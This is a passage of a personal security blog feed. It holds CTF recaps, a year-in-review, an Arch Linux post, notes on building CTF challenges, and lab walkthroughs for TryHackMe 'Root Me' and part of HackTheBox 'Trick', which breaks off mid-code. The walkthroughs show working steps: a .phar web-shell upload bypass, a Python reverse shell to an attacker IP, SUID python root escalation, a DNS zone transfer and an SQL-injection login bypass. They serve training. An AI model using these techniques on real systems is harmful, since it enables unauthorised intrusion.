<p>The frustrating thing for me is that I made such little progress in the full pwn/machine space as this is an area I tend to focus on in events. In this case I spent nearly 11 hours on a single challenge only to realize 15 minutes before the end of the event that the RCE vuln had been staring me in the face the entire time and I just hadn&rsquo;t realized what it was.</p>
<p>Lesson for others: If you see something and you don&rsquo;t know what it is, don&rsquo;t give up on your research easily. If it&rsquo;s insignificant, you&rsquo;ll probably still learn something. If it isn&rsquo;t, it might be what you need. In this case it was a string being surfaced (and then consumed) by the remote app that turned out to be <a href="https://docs.python.org/3/library/pickle.html">pickled data</a>. One small tweak to it and I would have had RCE. Boo.</p>
<p>Not that it matters in retrospect, but if I had caught that vulnerability earlier, I would have had a top 3 finish with just the points from that one challenge as only one person completed it.</p>
<p>The forensics challenge I finished was just deobfuscating Excel macros, which pointed me to a neat tool I hadn&rsquo;t seen before - <a href="https://github.com/DissectMalware/XLMMacroDeobfuscator">https://github.com/DissectMalware/XLMMacroDeobfuscator</a>. Worked like a charm, though for a simpler example.</p>
<p>Either way, another great learning experience. The next one for me will be nSec 2023 in Montreal. If you know a team looking for a mediocre hacker to join you&hellip; give me a shout!</p>
<h1 id="whats-coming-up-in-february">What&rsquo;s coming up in February?</h1>
<p>Not a lot. Taking a little more time for myself in the coming month as part of the &ldquo;decompression and reprioritization&rdquo; I outlined in my last post.</p>
<p>I plan to continue poking at some challenges on HackTheBox as I work toward <code>Pro Hacker</code> rank (lol), and I have some work projects on the go that should be a lot of fun to talk about once they get a bit further on. Expect some fun articles about both of those :D</p>
<p>Beyond that&hellip; check out <a href="http://live.projectdiablo2.com/">Project Diablo 2</a> if you enjoyed Diablo 2 back in the day and wish there had been some evolution of it that took a different and more thorough direction than D2: Resurrected. I&rsquo;ve burned nearly 200 hours on this since the current ladder season started, and I&rsquo;m sure there are dozens more to come!</p>
]]></content></item><item><title>Obligatory look back at 2022</title><link>https://www.maclaren.dev/posts/2022-12/make_a_ctf/</link><pubDate>Sun, 25 Dec 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-12/make_a_ctf/</guid><description>In retrospect&amp;hellip; Certainly there has been a fair bit of change for me over the course of 2022. I&amp;hellip;
Found a new hobby (CTF) and continue to build those skills Realized being a people manager wasn&amp;rsquo;t for me Have been involved in tons of engineering projects that I otherwise wouldn&amp;rsquo;t have had a chance to work on Changed career paths (within tech) pretty drastically Joined a great team and have seen its members grow significantly Am exploring multiple new and exciting career and learning opportunities Went on a trip to DEFCON, something I&amp;rsquo;ve wanted to do for many years Spoke at a security conference, and have submitted to the CFP for others!</description><content type="html"><![CDATA[<h1 id="in-retrospect">In retrospect&hellip;</h1>
<p>Certainly there has been a fair bit of change for me over the course of 2022. I&hellip;</p>
<ul>
<li>Found a new hobby (CTF) and continue to build those skills</li>
<li>Realized being a people manager wasn&rsquo;t for me</li>
<li>Have been involved in tons of engineering projects that I otherwise wouldn&rsquo;t have had a chance to work on</li>
<li>Changed career paths (within tech) pretty drastically</li>
<li>Joined a great team and have seen its members grow significantly</li>
<li>Am exploring multiple new and exciting career and learning opportunities</li>
<li>Went on a trip to DEFCON, something I&rsquo;ve wanted to do for many years</li>
<li>Spoke at a security conference, and have submitted to the CFP for others!</li>
<li>Blah, blah, blah&hellip;</li>
</ul>
<p>Yeah&hellip; I&rsquo;m getting bored even writing this. No point being overly self-celebratory, but I think it has been a good year and I&rsquo;m thrilled that I&rsquo;ve been able to learn so much, and have learned that I have <em>so</em> much still to learn.</p>
<h1 id="what-have-i-written-above-that-actually-matters">What have I written above that actually matters?</h1>
<p>The only major takeaway here is that I&rsquo;m learning more about what I want to be when I grow up. Frustrating that I&rsquo;m only figuring it out 15 years into my career, but better late than never! It was certainly a surprise to me that I didn&rsquo;t vibe with management as well as I thought I would. The project work was interesting, and I loved working with people to help them grow/advance in their careers, but there was a ton that didn&rsquo;t click with me. I wrote more on that subject a couple of months ago so I won&rsquo;t go into it too far, suffice it to say that ~9 months after making the decision to go back to an individual contributor role I don&rsquo;t regret the choice.</p>
<p>I&rsquo;m particularly proud of the knowledge I&rsquo;ve gained in the security space, since really only re-focusing on it since December of 2021. It&rsquo;s hardly a mark of accomplishment, but I&rsquo;ve won/placed Top 3 in two CTF competitions, created my own CTF challenges used in a multi-thousand player event, reached <code>Hacker</code> rank on HackTheBox (it&rsquo;s low, I know, but it&rsquo;s something), and have made some great friends and connections along the way.</p>
<p>Lastly, something I&rsquo;ve seen that really shouldn&rsquo;t be understated is how important the skills people build in customer-facing situations are for any &ldquo;corporate&rdquo; job. At the end of the day it&rsquo;s customers that are paying your salary (or will be, eventually) so understand how that relationship works and how the sausage is made as a result of it is hugely valuable when it comes to understanding priorities, pushing new ideas, and building relationships. If you&rsquo;ve never worked in a complicated customer facing role&hellip; I recommend at least doing an &ldquo;internship&rdquo; with a team that does so you can learn what things are like from that side.</p>
<h1 id="whats-going-on-in-2023">What&rsquo;s going on in 2023?</h1>
<p>Once thing I&rsquo;ve learned about setting goals while learning things is that those goals are going to change. You&rsquo;re going to learn that they were either bad goals to begin with, or circumstances will change making them largely irrelevant.</p>
<p>Right now all I&rsquo;ll say for 2023 is that my goal is to continue learning. I need to continue to build up my coding skills and get more comfortable in the ecosystem(s) I work in now, and to that end I need far fewer distractions. So, for 2023:</p>
<ul>
<li><em>Fewer</em> projects</li>
<li><em>Narrower</em> scoping</li>
<li><em>More</em> touchpoints</li>
</ul>
<p>Boiling the ocean was great to get a broad feel for things, but that&rsquo;s not a long-term sustainable plan. I need to identify an area to focus in and dive into it. Even if the only thing that comes from 2023 is finding something in the Security space that really nerd-snipes me, that&rsquo;ll be a huge win in itself.</p>
<p>In areas with less commitment, I&rsquo;m also hoping to attend several conferences (NorthSec, DEFCON, BSides Ottawa, and others) as well as hopefully speak at a couple of them if I can continue to find interesting things to talk about. If nothing else, it&rsquo;ll be great to make some new friends and learn new things!</p>
<p>Side note - I&rsquo;m looking for a team for the NorthSec CTF. If you&rsquo;re looking for someone with an intermediate level of knowledge focused on web app and Linux CTF challenges&hellip; give me a shout!</p>
]]></content></item><item><title>Bare metal</title><link>https://www.maclaren.dev/posts/2022-11/baremetal/</link><pubDate>Thu, 17 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-11/baremetal/</guid><description>Vacations are dangerous I decided to take about a week and a half off to decompress, and it has been a fair bit more productive than I expected it to be given that the plan was to do nothing&amp;hellip;
I thought to myself:
Hey Logan, you&amp;rsquo;ve got nothing going on for the next few days, and could afford to do some firefighting if needed&amp;hellip; Why don&amp;rsquo;t you do a bare metal Arch install on your main rig?</description><content type="html"><![CDATA[<h1 id="vacations-are-dangerous">Vacations are dangerous</h1>
<p>I decided to take about a week and a half off to decompress, and it has been a fair bit more productive than I expected it to be given that the plan was to do <em>nothing</em>&hellip;</p>
<p>I thought to myself:</p>
<blockquote>
<p>Hey Logan, you&rsquo;ve got nothing going on for the next few days, and could afford to do some firefighting if needed&hellip; Why don&rsquo;t you do a bare metal Arch install on your main rig?</p>
</blockquote>
<p>And I did&hellip;</p>
<h1 id="you-already-know-i-use-arch-ive-told-you">You already know I use Arch, I&rsquo;ve told you</h1>
<p>I decided to run with Arch just because I was already familiar with it, and I love the rolling release approach that it uses instead of doing major upgrades like Ubuntu (though I use that on my server due to LTS). I also appreciate the overall approach of shipping with virtually nothing, and letting you (largely) do whatever you want. I find this all ironic given that Slackware was my first distro.</p>
<p>My worry with all of this is that I&rsquo;d still need to frequently dualboot to play games, which is one of the main usecases for this machine despite the fact that I spent a lot of time working out of Linux VMs (Arch and Kali). As it turns out, I should have listened to the opinions of people that I had dismissed as Linux zealots&hellip; I&rsquo;m <em>blown away</em> by how well things are running in Linux under Proton and/or Wine. Lutris and Steam make it almost trivial to do, as well. Sure, there&rsquo;s some tinkering required, but that makes the reward of actually playing the game all that much sweeter.</p>
<p><strong>It feels like I&rsquo;m using a computer again - not a toy</strong> and I can&rsquo;t express how much I enjoy that. I haven&rsquo;t felt this way when using a computer since the early 2000s.</p>
<h1 id="but-im-a-casual">But I&rsquo;m a casual&hellip;</h1>
<p>While this definitely isn&rsquo;t a fit for a super casual gamer, <em>however</em> I am amazed by how seamless Valve has made things with Steam. I could definitely see using a gaming-focused distro being a good option, especially with the direction (bloat, ads, hardware lockouts, etc&hellip;) Windows is heading in, and has been heading in for over a decade now.</p>
<p>Maybe its just infatuation but I&rsquo;ve spent more time in front of this computer in the past 3 days since doing this install than I have in the past few <em>months</em> outside of dedicated gaming time. Everything feels snappy, I can control everything just how I want it to, and the window manager (i3) does <em>my</em> bidding. I actually have control over my system!</p>
<h1 id="an-unexpected-benefit">An unexpected benefit</h1>
<p>One of the things I had not considered before making the jump was just how much I appreciate having a really good window manager, and the overall design choices that many things have - and of course the focus on command line. I have terrible RSI in my right shoulder from years of awful posture and low-sensitivity FPS games, and with <code>i3</code> (or comparable window manager) and the aforementioned command line focus I virtually <em>never</em> need to use my mouse outside of gaming.</p>
<p>On my Mac (work machine) I use <a href="https://ianyh.com/amethyst/">Amethyst</a> (mentioned in earlier blogs) which does some of this, but the Windows/MacOS regime of forcing specific key combinations to do things and providing no way to override them leads to a mediocre experience when compared to something more customizable.</p>
<p>For the sake of fairness, <a href="https://learn.microsoft.com/en-us/windows/powertoys/">Powertoys</a>' <code>FancyZones</code> is making headway on this in the Windows world, but is still leagues off of what any window manager on Linux (or BSD, etc&hellip;) can do. I&rsquo;ll also note that Amethyst has a <a href="https://amethystwindows.com/">Windows port</a> however due to OS-level restrictions in how things can work, this loses a lot of practicality. Cool project, but not usable IMO.</p>
<h1 id="setup-was-surprisingly-quick">Setup was surprisingly quick</h1>
<p>While I don&rsquo;t want to turn this entirely into a Windows bash-fest (or do I&hellip;? ð¤), I was thoroughly surprised by how quickly I was able to get everything set up. Having used Linux in VMs, and MacOS, for years now I&rsquo;ve got a good collection of dotfiles. It&rsquo;s hard to overstate how wonderful it is to just be able to clone a repo, set up a symlink, and have your desktop environment configured <em>exactly</em> how you want it to be.</p>
<p>One of the other nice things is that virtually (literally?) everything in this world is stored as a configuration file. If I ever need to reinstall, I&rsquo;ve already scripted out all the package installations I want, my <code>xrandr</code> config, <code>fstab</code>, and so on.</p>
<h1 id="whats-the-catch">What&rsquo;s the catch?</h1>
<p>I mentioned earlier this isn&rsquo;t a great casual solution, and I stand by that. While Steam makes gaming on Linux trivial, Lutris is a different beast. It&rsquo;s still <em>vastly</em> easier than trying to game via <code>wine</code> was a decade ago, but I&rsquo;ve done more tinkering than I expected to get things running. With that said, pretty much everything works&hellip; even the stuff I&rsquo;ve rigged to run off mounted NTFS partitions from my Windows installation.</p>
<p>Another catch is that <em>not everything</em> can run here. Notably, for me, there&rsquo;s no way to use XBox Game Pass due to how the apps are downloaded. This is a bit of a bummer, but given how little I use it on PC I don&rsquo;t think I&rsquo;ll mind the occasional reboot into Wintendo.</p>
<p>Lastly, from a gaming perspective, there&rsquo;s some weirdness that I have yet to deal with in terms of using things like mod managers (Vortex, etc&hellip;). While this really only affects a handful of games, it&rsquo;s part of the reason I play them on PC.</p>
<h1 id="loose-ends">Loose ends</h1>
<p>The endless tinkering continues&hellip; Some day it&rsquo;ll be worthy of <a href="https://reddit.com/r/unixporn">/r/unixporn</a>!</p>
]]></content></item><item><title>Contributing to a CTF event</title><link>https://www.maclaren.dev/posts/2022-11/make_a_ctf/</link><pubDate>Fri, 11 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-11/make_a_ctf/</guid><description>The project I recently had the opportunity to join a team building out some challenges for the Ekoparty CTF event, as my company has been a sponsor for a number of years. Given that I&amp;rsquo;ve been reasonably involved in playing CTFs as of late, as well as helping organize events within my company, I figured it might be fun to try building some challenges as well!
I worked with two colleagues to put together a series of 4 challenges:</description><content type="html"><![CDATA[<h1 id="the-project">The project</h1>
<p>I recently had the opportunity to join a team building out some challenges for the <a href="https://ekoparty.org">Ekoparty</a> CTF event, as my company has been a sponsor for a number of years. Given that I&rsquo;ve been reasonably involved in playing CTFs as of late, as well as helping organize events within my company, I figured it might be fun to try building some challenges as well!</p>
<p>I worked with two colleagues to put together a series of 4 challenges:</p>
<ul>
<li>Obfuscation (very easy)</li>
<li>Security misconfiguration (easy/medium&hellip; or so I thought)</li>
<li>Vulnerable web application (medium)</li>
<li>Reversing/binary exploitation (very hard)</li>
</ul>
<p>As I&rsquo;ve got little to no knowledge in the area of the final challenge, I focused on the first three. Specifically, I designed the overall challenge flow, helped design those three challenges, and wrote the entirety of the second challenge.</p>
<h1 id="designing-the-challenge-flow">Designing the challenge flow</h1>
<p>We had envisioned a set of sequential challenges, of increasing difficulty, all flowing into each other. We knew we wanted to cover a few different areas of challenge content, and that we wanted to work in our own product somehow. In the end, we decided on a &ldquo;university&rdquo; theme where students must first pass an admission test, then exploit a grading program to get access to another system. From that system, they can then leak an access token that will take them to the final challenge - a binary that the &ldquo;admins&rdquo; use to manage GitHub-hosted services (an API wrapper, basically).</p>
<p>Without going into too many details, as we&rsquo;re working on writeups for several of these challenges, we thought we had a winner in terms of our design. Unfortunately we hadn&rsquo;t realized that a somewhat non-traditional design was probably going to steer folks away from our challenges in favour of the dozens of others included in the event.</p>
<h1 id="the-challenge-i-built">The challenge I built&hellip;</h1>
<p>&hellip; was originally based around <a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">a reasonably well known Ruby vulnerability</a>, however throughout testing we identified that there were some trivial bypasses to the intended solution given how we were hosting the challenge. This lead to a full rewrite of the challenge two days before the deadline&hellip; nothing like a little time crunch to get the creative juices flowing!</p>
<p>In the end, the challenge wound up being based on <a href="https://github.com/marketplace/actions/approve-pull-request">using GitHub Actions</a>, with some lax security configuration, to work around branch protection rules. This would allow the player to merge whatever code they wanted onto the default branch and leak secret values that were only accessible from that branch. When going through this, I was worried this challenge was going to be far too easy since all you had to do was create a branch, put a new workflow on it, open a PR, and use another branch to run a workflow to approve it&hellip; Out of 200+ players who attempted the challenge, only 7 suceeeded.</p>
<p>Ironically, <em>dozens</em> of players spotted some leftover code from the original challenge that I kept as a rabbit hole, and wound up trying to use the aforementioned Ruby vuln. The real fun part there is that it was still a valid way to solve the challenge&hellip; but you had to find a way to get that code into the default branch to run it.</p>
<p>I&rsquo;ll have some more info about this challenge in the future as well :)</p>
<h1 id="lessons-learned">Lessons learned</h1>
<p>If you&rsquo;re going to be submitting challenges to a larger CTF event, there are a few things worth understanding up front:</p>
<ul>
<li>How are the challenges laid out? Is it jeopardy style, or more progressive?</li>
<li>How may challenges are there in total?</li>
<li>What&rsquo;s the average skill level of the players involved and are you an appealing target on CTFTime?</li>
<li>What are the other types of challenges that have been submitted to the event?</li>
</ul>
<p>I note these in particular as they&rsquo;re areas that we didn&rsquo;t fully understand coming into it. No shade toward the event organizers at all - this was on us to ask about and understand and we didn&rsquo;t do so&hellip; but we did learn from that!</p>
<h2 id="event-style">Event style</h2>
<p>If you&rsquo;re participating in an event that&rsquo;s jeopardy style, building a challenge like ours that required players to work through stages sequentially is going to stick out like a sore thumb, and will likely be avoided in favour of ones that can be attempted quickly.</p>
<h2 id="total-number-of-challenges">Total number of challenges</h2>
<p>If you&rsquo;re looking at an event with only a small number of challenges, you may have a bit more flexibility to try something out of the ordinary. On the other hand, if it&rsquo;s possible to build up a large enough score to win the event and still dodge a significant number of the challenges, you&rsquo;ll want to make yours appealing enough that people will attempt them, and difficult enough to challenge them.</p>
<h2 id="average-skill-level">Average skill level</h2>
<p>I&rsquo;ll be clear that this is said without a clear understading of the overall playerbase. We were very surprised by the low number of solves for our challenges. Out of 426 teams that posted a score, we had ~225 solves for stage 1, 7 for stage 2, and 3 for stage 3. No one solved the final challenge we submitted.</p>
<p>I think this is mostly on us for not meshing well with the overall event format (submitting a sequentially staged challenge to a jeopardy style event), but none the less a surprising outcome.</p>
<h2 id="types-of-challenges">Types of challenges</h2>
<p>This one I think is a more general statement than just this event. Again, given the style of our challenges, we stuck out a bit. We had four different categories of challenges listed out under a single heading (since we were a sponsor), rather than having them mixed in with the other relevant sections. A &ldquo;one-off&rdquo; challenge style would have played far better into all of this.</p>
<p>With that all said, we learned a ton, and we&rsquo;re already planning for next year. It has also been inspiring to me, and already has me working on some new challenges since I&rsquo;ve now got a better idea of how to build at least some basic ones after having solved dozens and helped to build a few others.</p>
<p>I want to share a huge thanks to Antonio and Jorge who worked on these challenges with me, as despite the less-than-ideal outcome I think we all learned a lot, and the feedback we got from event organizers and players was largely positive!</p>
]]></content></item><item><title>TryHackMe - Root Me</title><link>https://www.maclaren.dev/posts/2022-10/thm_rootme/</link><pubDate>Mon, 03 Oct 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-10/thm_rootme/</guid><description>Premise RootMe is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.
Throughout this walkthrough you&amp;rsquo;ll see reference to $target which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p><code>RootMe</code> is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.</p>
<p>Throughout this walkthrough you&rsquo;ll see reference to <code>$target</code> which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.</p>
<h1 id="recon">Recon</h1>
<p>A good place to start is to see what the target machine is running, both for services and OS. We can do this by running <code>nmap</code> against it with a few flags:</p>
<pre><code>sudo nmap -p- -sV -sC -vvv -o nmap.out $target
</code></pre><p>This will scan the full port range of the box, try to determine versions, run default scripts against the target, and dump our output to <code>nmap.out</code>. This isn&rsquo;t something you&rsquo;d probably want to do against a target in a pen test as it will be painfully obvious what you&rsquo;re doing, but for the puposes of these challenges it&rsquo;s just fine.</p>
<p>This scan shows us that we&rsquo;ve got TCP 22 (SSH) and 80 (HTTP) open on the target machine, and that it&rsquo;s running Apache 2.4.29.</p>
<p>With these two pieces of information available, next steps would be to see what SSH authentication mechanisms the server can provide, as well as fuzzing the web server to see what directories (and possibly hostnames) it responds on.</p>
<pre><code># Determine what auth types we see
$ ssh -vvv $target

# Fuzz the webserver to see what content may be available
$ ffuf -u http://$target/FUZZ -w ~/gh/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p>The SSH check shows us that the server will accept password based auth, or public key authentication. Let&rsquo;s keep an eye out for private key files, the ability to add a key to <code>authorized_keys</code> for a user, or hints that we can find a password. We can always brute force, and we may need to later, but that&rsquo;s often not ideal.</p>
<p>Fuzzing the webserver shows us the following directories:</p>
<ul>
<li>/uploads (this is interesting)</li>
<li>/panel (also interesting)</li>
<li>/js</li>
<li>/css</li>
</ul>
<p><code>uploads</code> redirects to <code>panel</code> which prompts us to uploada file. That&rsquo;ll be the next thing to play around with - see what the site does when we send it data we control.</p>
<h1 id="what-can-we-upload">What can we upload?</h1>
<p>Seemingly anything. The first attempt here is to upload a random file, and that&rsquo;s met with <code>O arquivo foi upado com sucesso!</code> which roughly translates to <code>File successfully uploaded!</code>.</p>
<p>We don&rsquo;t get a path for the uploaded file returned, however, making this slightly less useful. Let&rsquo;s take a closer look at the upload, and response, by capturing the traffic with Burp Suite (or similar tool).</p>
<p>The upload:</p>
<pre><code>POST /panel/ HTTP/1.1
Host: 10.10.186.89
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------20201163193198834099211560924
Content-Length: 354
Origin: http://10.10.186.89
DNT: 1
Connection: close
Referer: http://10.10.186.89/panel/
Cookie: PHPSESSID=kdmm74iroebpfj9612h6vrjou5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;bar&quot;
Content-Type: application/octet-stream

foo

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name=&quot;submit&quot;

Upload
-----------------------------20201163193198834099211560924--
</code></pre><p>While the response doesn&rsquo;t give us anything overly interesting, since we know the filename, and the directory structure on the taret, we can make some assumptions. We&rsquo;ve uploaded a file called <code>bar</code>&hellip; let&rsquo;s see if it exists at <code>http://$target/uploads/bar</code> - it does!</p>
<p>The other piece of information we see here is that there&rsquo;s a <code>PHPSESSID</code> cookie, so we can assume the server is <em>probably</em> running PHP. Since we have arbitrary file upload capability, and we know where the file will land, maybe we can upload a <a href="https://en.wikipedia.org/wiki/Web_shell">web shell</a> like <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">this one</a>.</p>
<p>The website prevents us from uploading a file with the <code>.php</code> extension, so let&rsquo;s try bypassing that by just uploading it as an <code>html</code> file (e.g. <code>shell.html</code>). That works, but our shell doesn&rsquo;t seem to be able to actually run any commands. What if we try another PHP file extension like <code>.phar</code>? Bingo.</p>
<pre><code>curl http://10.10.186.89/uploads/shell.phar\?cmd\=whoami
&lt;html&gt;
&lt;body&gt;
&lt;form method=&quot;GET&quot; name=&quot;shell.phar&quot;&gt;
&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;
www-data
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h1 id="running-commmands">Running commmands</h1>
<p>Now that we&rsquo;ve got a way to poke around on the remote machine, let&rsquo;s see if we can find our first flag, and then a way to get direct access. I want to start by exploring the file system - seeing where I am with <code>pwd</code>, and dumping directory contents with <code>ls</code>. I also want to see what other users we have on the system, so that we can start to try to gain access as one of them:</p>
<pre><code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fetc%2Fpasswd
</code></pre><p>Removing the users with no shell, or that we&rsquo;re not interested in, we get the following:</p>
<pre><code>rootâ0:0:root:/root:/bin/bash
rootmeâ1000:1000:RootMe:/home/rootme:/bin/bash
testâ1001:1001:,,,:/home/test:/bin/bash
</code></pre><p>This recon also leads us to our first flag under <code>/var/www/</code> which we can retrieve with <code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fvar%2Fwww%2Fuser.txt</code>.</p>
<h1 id="persistence">Persistence</h1>
<p>Let&rsquo;s see if we can find anything under <code>/home/test</code> or <code>/home/rootme</code>. Nope, <code>ls</code> on either directory returns nothing, so they&rsquo;re either empty or more likely we don&rsquo;t have permission to see anything. While there&rsquo;s no luck on that front, perhaps we can brute force a password for SSH access with <code>Hydra</code>:</p>
<p>I&rsquo;m going to start with the <code>test</code> user, and the <code>RockYou</code> wordlist:</p>
<pre><code>hydra -l test -p ~/tools/rockyou.txt ssh://$target
</code></pre><p>No luck here, but maybe there are some other options. We could look at a few possibilities here:</p>
<ul>
<li>We can look for some other interesting privilege escalation mechanisms like binaries with the SUID bit, which may just give us root acces (<code>find / -user root -perm -4000</code>).</li>
<li>Since we can run arbitrary commands, we can probably get a reverse shell.</li>
<li>We know we can upload files and run arbitrary commands, so we could load something like <code>linpeas</code> or <code>linenum</code>.</li>
</ul>
<p>Checking the SUID binaries first, we can see a pretty normal list, however this also includes <code>/usr/bin/python</code> which it definitely shouldn&rsquo;t&hellip; Can we run commands as <code>root</code> simply by invoking them through <code>python</code>?</p>
<p>Let&rsquo;s try to pop a <a href="https://www.revshells.com/">reverse shell</a> from the <code>root</code> user. This will mean we need to set up a listener on our machine - <code>nc -l 9001</code> - and then spawn the connection from the remote machine to us:</p>
<pre><code>export RHOST=&quot;10.13.41.1&quot;;export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)'
</code></pre><p>This gets us a reverse shell, but it&rsquo;s still running as the <code>www-data</code> user. Let&rsquo;s try using Python directly to get us a root shell since it has the ability to do so in this challenge:</p>
<pre><code>$ python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
# whoami
whoami
root
</code></pre><p>GG!</p>
]]></content></item><item><title>HackTheBox - Trick</title><link>https://www.maclaren.dev/posts/2022-09/htb_trick/</link><pubDate>Sun, 11 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-09/htb_trick/</guid><description>Premise Trick is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!
Recon If we hit the challenge&amp;rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just https://startbootstrap/&amp;lt;stuff here&amp;gt;) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have .</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p><code>Trick</code> is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!</p>
<h1 id="recon">Recon</h1>
<p>If we hit the challenge&rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just <code>https://startbootstrap/&lt;stuff here&gt;</code>) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have <code>.com</code> on the end. Nothing else to see here, and fuzzing the IP for other endpoints/subdirs will go nowhere. The only other basic enumeration that we get from here is that we&rsquo;re accessing an Nginx 1.14.2 server - this will be helpful information later.</p>
<p>A quick <code>nmap</code> scan will show us that TCP 22, 25, 53, and 80 are open - SSH, SMTP, DNS, and HTTP respectively. What stands out here is that we&rsquo;ve got a DNS server running - right away I&rsquo;m thinking we can use that to find out other hostnames for the machine. Let&rsquo;s do a reverse lookup:</p>
<pre><code>dig -x $target @$target

; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -x 10.129.66.216 @10.129.66.216
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32934
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;216.66.129.10.in-addr.arpa.    IN      PTR

;; ANSWER SECTION:
216.66.129.10.in-addr.arpa. 604800 IN   PTR     trick.htb.

;; AUTHORITY SECTION:
66.129.10.in-addr.arpa. 604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 24 msec
;; SERVER: 10.129.66.216#53(10.129.66.216)
;; WHEN: Sun Sep 11 06:12:05 EDT 2022
;; MSG SIZE  rcvd: 136
</code></pre><p>Ok, we have an initial domain! Let&rsquo;s plug it into <code>/etc/hosts</code> and&hellip; Oh, that&rsquo;s not useful for much, it&rsquo;s the same content.</p>
<p>What if we try a zone transfer attack to see what else the nameserver handles?</p>
<pre><code>dig axfr @$target trick.htb

; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; axfr @10.129.54.230 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 19 msec
;; SERVER: 10.129.54.230#53(10.129.54.230)
;; WHEN: Sat Sep 10 21:38:37 EDT 2022
;; XFR size: 6 records (messages 1, bytes 203)
</code></pre><p>That&rsquo;s more like it! After updating <code>/etc/hosts</code> to include <code>preprod-paywall.trick.htb</code> we&rsquo;ve got a new website being served up.</p>
<h1 id="lovely-filter-inclusions">Lovely Filter Inclusions</h1>
<p>Once we get to the Payroll site, we are met with a login page that we don&rsquo;t have credentials for. Fortunately it&rsquo;s vulnerable to some basic SQLi - a username of <code>admin' or 1=1; -- </code> will get us right in,</p>
<p>Poking around from here for SSTI or other possible PHP vulns doesn&rsquo;t get too far, however XSS/HTML injection is possible in a few places, including the <code>Name</code> field on the <code>Users</code> tab of this interface. I spent a good 2 hours here before finally giving up on it&hellip; it turns out this was a complete rabbithole. RFI/RCE is not possible here, and anything you can dump via XSS on it is basically useless.</p>
<p>Where we do get some traction here is in the other tabs - one of interest is the <code>Employee</code> tab where we see this as the main content:</p>
<pre><code>  &lt;script type=&quot;text/javascript&quot;&gt;
    $(document).ready(function(){

      

      
      $('.edit_employee').click(function(){
        var $id=$(this).attr('data-id');
        uni_modal(&quot;Edit Employee&quot;,&quot;manage_employee.php?id=&quot;+$id)
        
      });
      $('.view_employee').click(function(){
        var $id=$(this).attr('data-id');
        uni_modal(&quot;Employee Details&quot;,&quot;view_employee.php?id=&quot;+$id,&quot;mid-large&quot;)
        
      });
      $('#new_emp_btn').click(function(){
        uni_modal(&quot;New Employee&quot;,&quot;manage_employee.php&quot;)
      })
      $('.remove_employee').click(function(){
